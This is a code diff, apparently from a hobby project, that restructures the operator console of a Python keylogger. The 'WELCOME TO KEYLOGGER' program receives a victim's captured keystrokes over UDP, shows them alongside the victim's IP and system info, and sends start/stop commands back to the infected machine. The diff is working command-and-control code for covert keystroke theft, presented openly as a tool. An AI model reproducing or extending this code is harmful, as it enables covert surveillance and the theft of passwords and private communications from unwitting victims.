@@ -12,9 +12,11 @@ import socket, os
 import json
 import threading
 from typing import Optional
+import time
+# import keyboard
 from pynput.keyboard import Listener, Key
 
-
+line = "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
 banner = """
 ┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓
 ┃  ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⡠⢤⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀         ┃
@@ -43,8 +45,9 @@ banner = """
 ┃  ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠙⢿⣤⣤⠴⠟⠋⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠑⠤⠀⠀⠀⠀⠀⢩⠇⠀⠀⠀         ┃
 ┃  ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀         ┃"""
 
+
 class ConsoleMenu:
-    def __init__(self, ip_victim: Optional[str] = None, port_send: int = 9998):
+    def __init__(self):
         self.appname = "★彡━━━━━★ W E L C O M E  T O  K E Y L O G G E R ★━━━━━彡★"
         self.pause_continue = {"Pause": "Pause", "Continue": "Continue"}
         self.options = [
@@ -52,58 +55,49 @@ class ConsoleMenu:
             f"{self.pause_continue['Pause']}", # Continue
             "Exit"
         ]
+        # self.controller = None
         self.current_selection = 0
-        self.running = True
-        self.ip_victim = ip_victim
-        self.port_send = port_send
-
 
     def clear_screen(self):
         os.system('cls' if os.name == 'nt' else 'clear')
 
-    def draw_menu(self, info_victim, buffer):
+    def base_menu(self):
         menu_width = len(self.appname) + 6
 
         print()
-        print(banner)
-        print("┣" + "━" * menu_width + "┫")
-        print("┃  " + self.appname + "  ┃")
-        print("┣" + "━" * menu_width + "┫")
+        print("\033[32m" + banner + "\033[0m")
+        print("\033[32m" + "┣" + "━" * menu_width + "┫" + "\033[0m")
+        print("\033[32m" + "┃  " + self.appname + "  ┃" + "\033[0m")
+        print("\033[32m" + "┣" + "━" * menu_width + "┫" + "\033[0m")
 
         for i, option in enumerate(self.options):
             prefix = "-> " if i == self.current_selection else "   "
             option_text = f"{prefix}{option}"
             spaces = menu_width - len(option_text)
-            print(f"┃{option_text}{' ' * spaces}┃")
+            print("\033[32m" + f"┃{option_text}{' ' * spaces}┃" + "\033[0m")
 
-        print("┣" + "━" * menu_width + "┫")
+        print("\033[32m" + "┣" + "━" * menu_width + "┫" + "\033[0m")
         footer = "↑↓ Переключить пункт • Enter Подтвердить"
         padding = (menu_width - len(footer)) // 2
-        print("┃" + " " * padding + footer + " " * padding + " ┃")
-        print("┗" + "━" * menu_width + "┛")
-        # print("┣" + "━" * menu_width + "┫")
-        print(info_victim)
+        print("\033[32m" + "┃" + " " * padding + footer + " " * padding + " ┃" + "\033[0m")
+        print("\033[32m" + "┗" + "━" * menu_width + "┛" + "\033[0m")
+
+    def draw_console(self, info_victim, buffer):
+        self.base_menu()
+        print("\033[32m" + info_victim + "\033[0m")
         # print("┗" + "━" * menu_width + "┛")
-        print("Keystroke operation ->", buffer)
+        print("\033[32m" + "Keystroke operation ->", buffer, "\033[0m")
 
-    def init_for_commands():
-        pass
 
-    def execute_selection(self, ):
-        option = self.current_selection
-        print(f"\nВыбранная опция: {self.options[option]}")
-
-        if option == 0:
-            self.buffer = ""
-        if option == 1:
-            if self.options[1] == "Pause":
-                self.options[1] = f"{self.pause_continue['Continue']}"
-                self.send_command("stop")
-            else:
-                self.options[1] = f"{self.pause_continue['Pause']}"
-                self.send_command("start")
-        if option == 2:
-            self.running = False
+class ControllerServer:
+    def __init__(self, consoleMenu: ConsoleMenu, ip_victim: Optional[str] = None, port_listen: int = 9999, port_send: int = 9998):
+        self.consoleMenu = consoleMenu
+        self.ip_victim = ip_victim
+        self.port_listen = port_listen
+        self.port_send = port_send
+        self.running = True
+        self.buffer = ""
+        self.info_victim = ""
 
     def send_command(self, message: str, timeout: float = 2.0):
 
@@ -120,48 +114,63 @@ class ConsoleMenu:
             except Exception as e:
                 pass
 
+    def execute_selection(self):
+        option = self.consoleMenu.current_selection
+        print(f"\nВыбранная опция: {self.consoleMenu.options[option]}")
+
+        if option == 0:
+            self.buffer = ""
+        if option == 1:
+            if self.consoleMenu.options[1] == "Pause":
+                self.consoleMenu.options[1] = f"{self.consoleMenu.pause_continue['Continue']}"
+                self.send_command("stop")
+            else:
+                self.consoleMenu.options[1] = f"{self.consoleMenu.pause_continue['Pause']}"
+                self.send_command("start")
+        if option == 2:
+            self.running = False
+
     def on_press(self, key):
         try:
             if key == Key.up:
-                self.current_selection = (self.current_selection - 1) % len(self.options)
+                self.consoleMenu.current_selection = (self.consoleMenu.current_selection - 1) % len(self.consoleMenu.options)
             elif key == Key.down:
-                self.current_selection = (self.current_selection + 1) % len(self.options)
+                self.consoleMenu.current_selection = (self.consoleMenu.current_selection + 1) % len(self.consoleMenu.options)
             elif key == Key.enter:
                 self.execute_selection()
-            self.clear_screen()
-            self.draw_menu()
+            self.consoleMenu.clear_screen()
+            self.consoleMenu.draw_console(info_victim=self.info_victim,
+                                            buffer=self.buffer)
         except AttributeError:
             pass
 
     def on_release(self, key):
         try:
             if key == Key.esc or not self.running:
+                self.running = False
                 return False
         except AttributeError:
             pass
 
-    def run(self):
-        self.clear_screen()
-        self.draw_menu()
+    def start_monitor(self):
+        self.consoleMenu.clear_screen()
+        self.consoleMenu.draw_console(info_victim=self.info_victim,
+                                            buffer=self.buffer)
         with Listener(on_press=self.on_press, on_release=self.on_release) as listener:
             listener.join()
 
-class ControllerServer:
-    def __init__(self, ip_victim: Optional[str] = None, port_listen: int = 9999):
-        self.ip_victim = ip_victim
-        self.port_listen = port_listen
-        self.buffer = ""
-        self.info_victim = ""
-        self.menu = ConsoleMenu()
-
     def listen_clients(self, buffer_size: int = 8192):
+        # self.start_monitor()
+        start_monitor_thread = threading.Thread(target=self.start_monitor)
+        start_monitor_thread.start()
         sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
         sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
         sock.bind(('0.0.0.0', self.port_listen))
         sock.settimeout(1)
+        #print(f"UDP server listening on {self.ip_victim}:{self.port_listen} (press Ctrl+C to stop)")
 
         try:
-            while True:
+            while self.running:
                 try:
                     data, _ = sock.recvfrom(buffer_size)
                     data = json.loads(data.decode())
@@ -173,13 +182,14 @@ class ControllerServer:
                             or self.ip_victim != ip_victim
                             or self.info_victim == data_str):
                         self.ip_victim = ip_victim
-                        self.menu.send_command(message="Server_active")
+                        self.send_command(message="Server_active")
                         self.info_victim = data_str
                         continue
+
                     if signal:
                         self.buffer += data_str
-                        self.menu.clear_screen()
-                        self.menu.draw_menu(self.info_victim, self.buffer)
+                        self.consoleMenu.clear_screen()
+                        self.consoleMenu.draw_console(info_victim=self.info_victim, buffer=self.buffer)
                     else:
                         self.buffer = ""
                 except socket.timeout as e:
@@ -193,17 +203,15 @@ class ControllerServer:
             print("\nReceived Ctrl+C — shutting down server gracefully.")
         finally:
             sock.close()
+            if start_monitor_thread.is_alive():
+                start_monitor_thread.join(timeout=3)
             print("Socket closed. Bye.")
 
+
 def main():
-    listener_thread = threading.Thread(target=controller.listen_clients, daemon=True)
-    listener_thread.start()
-    controller = ControllerServer()
-    
-    try:
-        controller.menu.run()
-    except KeyboardInterrupt:
-        print("\nReceived Ctrl+C — shutting down server gracefully.")
+    menu = ConsoleMenu()
+    controller = ControllerServer(consoleMenu=menu)
+    controller.listen_clients()
 
 if __name__ == "__main__":
     main()
